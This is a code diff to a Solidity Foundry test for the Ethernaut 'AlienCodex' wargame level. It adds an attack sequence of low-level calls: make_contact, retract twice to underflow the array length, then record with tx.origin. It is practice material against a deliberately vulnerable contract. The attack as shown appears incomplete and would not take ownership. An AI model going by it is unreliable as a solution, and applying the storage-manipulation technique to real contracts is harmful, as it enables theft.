@@ -1,6 +1,7 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
+import "forge-std/console.sol";
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
 
@@ -32,8 +33,16 @@ contract AlienCodexTest is DSTest {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
+        console.log(tx.origin);
+        //console.log(alienCodex.staticcall(abi.encodeWithSignature("owner()")));
+        alienCodex.call(abi.encodeWithSignature("make_contact()"));
+        alienCodex.call(abi.encodeWithSignature("retract()"));
+        alienCodex.call(abi.encodeWithSignature("retract()"));
+        alienCodex.call(abi.encodeWithSignature("record(bytes32)", tx.origin));
+        //console.log(alienCodex.staticcall(abi.encodeWithSignature("owner()")));
+        console.log(tx.origin);
 
-        /* testing solve branch */
+
 
         //////////////////////
         // LEVEL SUBMISSION //
